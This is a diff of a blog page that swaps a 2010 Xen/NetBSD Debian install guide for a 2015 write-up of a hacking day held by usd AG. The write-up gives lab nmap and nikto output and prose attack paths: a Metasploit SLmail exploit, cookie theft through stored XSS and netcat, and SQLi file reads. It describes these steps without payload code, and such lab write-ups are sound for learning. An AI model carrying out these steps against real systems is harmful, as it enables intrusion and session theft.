-<p><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/56c40ca6af90719b9b01fe0f322def4f.jpg"><img class="trigger_lightbox mceItem" title="Debian Install - Choose Language" alt="Debian Install - Choose Language" src="http://static.dornea.nu/img/2010/56c40ca6af90719b9b01fe0f322def4f.jpg" width="590" height="443" /></a></p>
-<p>&nbsp;</p>
-<p>The Debian installer should also configure network automatically by DHCP.</p>
-<p><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/68192a4dc30356c7b294e0a403d76e89.jpg"><img class="trigger_lightbox mceItem" title="Debian Installer - Configure network by DHCP" alt="Debian Installer - Configure network by DHCP" src="http://static.dornea.nu/img/2010/68192a4dc30356c7b294e0a403d76e89.jpg" width="590" height="443" /></a></p>
-<p><strong><span style="color: #ff0000;">If this fails, then you should go back to the main installer menu and &#8220;Execute a shell&#8221;. Afterwards run &#8220;dhclient eth0&#8243; as shown below:<br /> </span></strong></p>
-<p><span class="trigger_lightbox"><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/6b570bf1a97c46df57bed8bf491d5b8f.jpg"><img class="trigger_lightbox mceItem" style="float: left; padding-right: 2px;" title="Debian Installer - Configure network manually" alt="Debian Installer - Configure network manually" src="http://static.dornea.nu/img/2010/6b570bf1a97c46df57bed8bf491d5b8f.jpg" width="313" height="207" /></a><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/bdaccf19b0a9aeaeb0d8974a1b4695e4.jpg"><img class="trigger_lightbox mceItem" title="Debian Installer - Configure network manually - dhclient eth0" alt="Debian Installer - Configure network manually - dhclient eth0" src="http://static.dornea.nu/img/2010/bdaccf19b0a9aeaeb0d8974a1b4695e4.jpg" width="275" height="206" /></a><br /> </span></p>
-<p>Then proceed with the installation process&#8230;</p>
-<p><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/4f84fcd0c434884b03a50531499c541c.jpg"><img class="trigger_lightbox mceItem" style="float: left; padding-right: 2px;" title="Debian Installer - Configure network / proceed with installation process" alt="Debian Installer - Configure network / proceed with installation process" src="http://static.dornea.nu/img/2010/4f84fcd0c434884b03a50531499c541c.jpg" width="295" height="220" /></a><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/560b3db8c519b3d8c561429dc840ed73.jpg"><img class="trigger_lightbox mceItem" title="Debian Installer - Network configuration succeeded" alt="Debian Installer - Network configuration succeeded" src="http://static.dornea.nu/img/2010/560b3db8c519b3d8c561429dc840ed73.jpg" width="295" height="221" /></a></p>
-<p><span style="color: #ff0000;"><strong>Attention: </strong><span style="color: #000000;">When configuring the virtual disk, </span></span>have in mind that you should format your disk as ext2 and <strong>not as ext3</strong>. Ext3 is currently not supported by NetBSD. When you have reached the partitioning step, select the partition marked as ext3, press enter and change afterwards the file system type to ext2. Then you should select &#8220;Done setting up the partition&#8221; and press enter.</p>
-<h2 id="_6"><span id="i-6"><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/8b9b3a02919c388d16d8bdd25c4fef01.jpg"><img class="trigger_lightbox mceItem" style="float: left; padding-right: 2px;" title="Debian Installer - Partitioning/ Change file system type to ext2" alt="Debian Installer - Partitioning/ Change file system type to ext2" src="http://static.dornea.nu/img/2010/8b9b3a02919c388d16d8bdd25c4fef01.jpg" width="293" height="220" /></a><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/cbd9626a2849d42d044ef161349e6bb7.jpg"><img class="trigger_lightbox mceItem" title="Debian Installer - Partitioning/ Change file system type to ext2" alt="Debian Installer - Partitioning/ Change file system type to ext2" src="http://static.dornea.nu/img/2010/cbd9626a2849d42d044ef161349e6bb7.jpg" width="295" height="221" /></a></span></h2>
-<p><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/aaa8de2581873be2e1b1e13972f468f4.jpg"><img class="trigger_lightbox mceItem" style="float: left; padding-right: 2px;" title="Debian Installer - Partitioning/ Change file system type to ext2" alt="Debian Installer - Partitioning/ Change file system type to ext2" src="http://static.dornea.nu/img/2010/aaa8de2581873be2e1b1e13972f468f4.jpg" width="293" height="220" /></a><a class="trigger_lightbox" href="http://static.dornea.nu/img/2010/f3cb029d9740b3b32fc13e27af86a5af.jpg"><img class="trigger_lightbox mceItem" title="Debian Installer - Partitioning/ Change file system type to ext2" alt="Debian Installer - Partitioning/ Change file system type to ext2" src="http://static.dornea.nu/img/2010/f3cb029d9740b3b32fc13e27af86a5af.jpg" width="295" height="221" /></a></p>
-<p>You should now go through the installation process without experiencing any troubles. At the end of the installation you won&#8217;t have to install grub nor any boot loader, so simply ignore the error messages and select &#8220;Continue&#8221;. Even if you should go back to the main installation menu, select &#8220;Continue without any boot loader&#8221; and everything will be alright.</p>
-<h2 id="step-7-start-your-fresh-new-debian-system"><span id="Step_7_Start_your_fresh_new_Debian_system"><strong><span style="text-decoration: underline;">Step 7: Start your fresh new Debian system</span></strong></span></h2>
-<p>First you&#8217;ll have to extract &#8220;vmlinuz&#8221; and &#8220;initrd.gz&#8221; from your local disk container. NetBSD provides vnconfig(8) to configure pseudo disk devices.</p>
-<pre class="lang:default decode:true">$ vnconfig vnd0 Debian-Lenny.img
-$ disklabel /dev/vnd0
-# /dev/vnd0d:
-type: vnd
-disk: vnd
-label: fictitious
-flags:
-bytes/sector: 512
-sectors/track: 32
-tracks/cylinder: 64
-sectors/cylinder: 2048
-cylinders: 1024
-total sectors: 2097152
-rpm: 3600
-interleave: 1
-trackskew: 0
-cylinderskew: 0
-headswitch: 0 # microseconds
-track-to-track seek: 0 # microseconds
-drivedata: 0
+<ul>
+<li>It&#39;s a Windows box :D</li>
+<li>A <strong>lot</strong> of services are exposed</li>
+<li>There is a <strong>smtpd</strong> running on port 25 (that might be interesting)</li>
+</ul>
+<p><br/>
+<strong>Solution</strong>:</p>
+<hr/>
 
-9 partitions:
-# size offset fstype [fsize bsize cpg/sgs]
-d: 2097152 0 unused 0 0 # (Cyl. 0 - 1023)
-e: 1863477 63 Linux Ext2 0 0 # (Cyl. 0*- 909*)
-i: 224847 1863603 swap # (Cyl. 909*- 1019*)
-disklabel: boot block size 0
-disklabel: super block size 0</pre>
+<ul>
+<li>Search in <strong>metasploit</strong> for <em>SLmail smtpd 5.5.0.4433</em></li>
+<li>Use found exploit to gain access to the machine</li>
+<li>And voila you&#39;re logged in as admin</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="10.10.10.24">10.10.10.24<a class="anchor-link" href="#10.10.10.24">&#182;</a></h3>
+</div>
+</div>
+</div>
 
-<p>As expected we have a swap partition and a ext2 (!!!) file system. We&#8217;ll try now to mount it in order to extract the previously mentioned files:</p>
-<pre class="lang:default decode:true">$ mount -t ext2fs /dev/vnd0e /mnt
-$ file /mnt/vmlinuz /mnt/vmlinuz: symbolic link to `boot/vmlinuz-2.6.26-2-686-bigmem'
-$ file /mnt/initrd.img /mnt/initrd.img: symbolic link to `boot/initrd.img-2.6.26-2-686-bigmem'</pre>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>1) <strong>Nmap</strong> results:</p>
+<pre><code>Nmap scan report for 10.10.10.24
+Host is up (0.0026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 5e:c5:45:45:52:12:47:04:1d:cc:b5:28:ca:91:5d:6c (DSA)
+|_  2048 e3:29:e3:18:43:20:3d:c7:be:a9:7f:13:62:99:06:10 (RSA)
+80/tcp open  http    Apache httpd 2.2.16 ((Debian))
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: PentesterLab vulnerable blog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-<p>Now all you&#8217;ll have to do is to copy these files to your local partition and use them in your domU configuration. On my laptop I&#8217;ve created /home/xen:</p>
-<pre class="lang:default decode:true">$ ls -lR total 16
-drwxr-xr-x 2 root wheel 512 Mar 22 17:04 conf
-drwxr-xr-x 2 root wheel 512 Mar 6 22:07 container
-drwxr-xr-x 2 root wheel 512 Mar 6 22:08 kernel
-drwxr-xr-x 2 root wheel 512 Mar 6 22:06 ramdisk
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
+</code></pre><p>2) <strong>Nikto</strong> results:</p>
+<pre><code>- Nikto v2.1.5
+ ---------------------------------------------------------------------------
+ + Target IP:          10.10.10.24
+ + Target Hostname:    10.10.10.24
+ + Target Port:        80
+ + Start Time:         2015-06-03 15:00:49 (GMT2)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.2.16 (Debian)
+ + Retrieved x-powered-by header: PHP/5.3.3-7+squeeze18
+ + The anti-clickjacking X-Frame-Options header is not present.
+ + OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &quot;http://127.0.0.1/images/&quot;.
+ + Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ + Server leaks inodes via ETags, header found with file /favicon.ico, inode: 6756, size: 14634, mtime: 0x4e1d6b3f0db40
+ + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ + Cookie PHPSESSID created without the httponly flag
+ + OSVDB-5034: /admin/login.php?action=insert&amp;username=test&amp;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user &#39;t
+ est&#39; password &#39;test&#39; to verify.
+ + OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ + OSVDB-3268: /icons/: Directory indexing found.
+ + OSVDB-3268: /images/: Directory indexing found.
+ + OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
+ + OSVDB-3233: /icons/README: Apache default file found.
+ + /admin/login.php: Admin login page/section found.
+ + 6545 items checked: 0 error(s) and 14 item(s) reported on remote host
+ + End Time:           2015-06-03 15:01:58 (GMT2) (69 seconds)
+</code></pre><p><br/>
+<strong>Observations</strong>:</p>
+<hr/>
 
-./conf:
-total 32
--rw-r--r-- 1 root wheel 2676 Mar 6 22:08 Debian-Lenny.conf
+<ul>
+<li>It&#39;s a <strong>blog</strong> system</li>
+<li>Authentification is done via session id (<code>=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>)</li>
+<li>There is an <strong>admin area</strong> (/admin/login.php)</li>
+</ul>
+<p><br/>
+<strong>Solution</strong>:</p>
+<hr/>
 
-./container:
-total 4195360
--rw-r--r-- 1 root users 2147483648 Mar 6 21:38 Debian-Lenny.img
+<ul>
+<li>Inside the comments section you can store a <strong>persistent XSS</strong></li>
+<li>There is a cronjob which &quot;visits&quot; the site logged in as <strong>admin</strong></li>
+<li><p>The main idea was to <strong>steal</strong> admins <strong>sesssion</strong> using the XSS:</p>
+<ul>
+<li>Create XSS payload and send <code>document.cookie</code> to a box listening on a certain port</li>
+<li>Using <code>netcat</code> you had to listen for the incomming request which exposed admins session</li>
+<li>Once you have stolen the session you could use it to access the admin area</li>
+</ul>
+</li>
+<li><p>Inside the admin area there was a <strong>SQLi</strong> which you could use to <strong>read files</strong> from filesystem</p>
+</li>
+<li>Having read <code>/etc/passwd</code> you were to see which users were available on the box</li>
+<li>Log in as <strong>user:live</strong>  to the machine (per SSH)</li>
+<li>? (I can&#39;t remember the last step(s) xD)</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Conclusion">Conclusion<a class="anchor-link" href="#Conclusion">&#182;</a></h2>
+</div>
+</div>
+</div>
 
-./kernel:
-total 3072
--rw-r--r-- 1 root wheel 1548304 Mar 5 18:03 Debian-Lenny-vmlinuz-2.6.26-2-686-bigmem
-
-./ramdisk:
-total 12192
--rw-r--r-- 1 root wheel 6214259 Mar 5 18:03 Debian-Lenny-initrd.img-2.6.26-2-686-bigmem</pre>
-
-<p>Debian-Lenny.conf in <em>conf </em>contains:</p>
-<pre class="lang:default decode:true crayon-selected"># Kernel image file. This kernel will be loaded in the new domain.
-kernel = "/home/xen/kernel/Debian-Lenny-vmlinuz-2.6.26-2-686-bigmem"
-ramdisk = "/home/xen/ramdisk/Debian-Lenny-initrd.img-2.6.26-2-686-bigmem"
-
-# Memory allocation (in megabytes) for the new domain.
-memory = 156
-
-# A handy name for your new domain. This will appear in 'xm list',
-# and you can use this as parameters for xm in place of the domain
-# number. All domains must have different names.
-
-name = "Debian-Lenny"
-vif = [ 'mac=00:16:3e:2e:32:5f, bridge=bridge0' ]
-
-disk = [ 'file:/home/xen/container/Debian-Lenny.img,xvda,w']
-
-# Set root device.
-root = "/dev/xvda"{/syntaxhighlighter}
-
-Now for the final step, launch your Debian domU using:
-
-{syntaxhighlighter brush: bash;fontsize: 100; first-line: 1; }$ cd conf
-$ pwd/home/xen/conf
-$ xen create -c Debian-Lenny.conf</pre>
-
-<p>Thats it! I hope you enjoyed this HowTo and if you have any questions/unsolved issues, just drop me a mail and I&#8217;ll try to help.</p></div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="prompt input_prompt">
+</div>
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>I&#39;d like to thank <a href="https://www.usd.de/">usd AG</a> for the organizational part and all participants for having a great time in Hamburg City. </p>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/4f41c02eeeb8fbee62da2751ffd913bc.jpg" width="99%"/></p>
+</div>
+</div>
+</div></p></div>
     <footer>
 <p class="meta">
   <span class="byline author vcard">
-    Posted by <span class="fn">Victor</span>
+    Posted by <span class="fn">Victor Dorneanu</span>
   </span>
-<time datetime="2010-03-22T00:00:00+01:00" pubdate>Mon 22 March 2010</time>  <span class="categories">
-    <a class="category" href="http://blog.dornea.nu/tag/howto/">howto</a>
+<time datetime="2015-05-24T00:00:00+02:00" pubdate>Sun 24 May 2015</time>  <span class="categories">
+    <a class="category" href="http://blog.dornea.nu/tag/ipython/">ipython</a>
+    <a class="category" href="http://blog.dornea.nu/tag/hacking/">hacking</a>
     <a class="category" href="http://blog.dornea.nu/tag/network/">network</a>
-    <a class="category" href="http://blog.dornea.nu/tag/virtualization/">virtualization</a>
+    <a class="category" href="http://blog.dornea.nu/tag/security/">security</a>
   </span>
 </p><div class="sharing">
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.dornea.nu/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd" data-via="victordorneanu" data-counturl="http://blog.dornea.nu/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd" >Tweet</a>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.dornea.nu/2015/05/24/usd-ag-hacker-day-in-hamburg" data-via="victordorneanu" data-counturl="http://blog.dornea.nu/2015/05/24/usd-ag-hacker-day-in-hamburg" >Tweet</a>
 </div>    </footer>
   </article>
 
@@ -2201,9 +2485,9 @@ $ xen create -c Debian-Lenny.conf</pre>
 </script>
 	<script type="text/javascript">
 	  var disqus_shortname = 'dorneanu';
-          var disqus_identifier = '/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd';
-          var disqus_url = 'http://blog.dornea.nu/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd';
-          var disqus_title = 'HowTo: Create new Debian domU using Xen on *BSD';
+          var disqus_identifier = '/2015/05/24/usd-ag-hacker-day-in-hamburg';
+          var disqus_url = 'http://blog.dornea.nu/2015/05/24/usd-ag-hacker-day-in-hamburg';
+          var disqus_title = 'usd AG Hacker Day in Hamburg';
 	  (function() {
 	    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
 	    dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
